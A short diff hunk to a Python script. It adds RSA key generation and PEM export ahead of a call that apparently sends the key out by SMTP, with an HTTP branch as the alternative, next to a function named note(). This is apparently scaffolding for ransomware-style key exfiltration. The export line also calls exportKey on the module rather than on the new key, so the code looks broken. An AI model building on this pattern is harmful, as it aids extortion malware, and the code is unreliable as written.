@@ -176,6 +176,8 @@ def note():
 	
 if __name__=="__main__":
 	if SMTP == True:
+		key = RSA.generate(2048)
+		exKey = RSA.exportKey('PEM')
 		send_Key_SMTP()
 	else:
 		Key_Ops_HTTP()
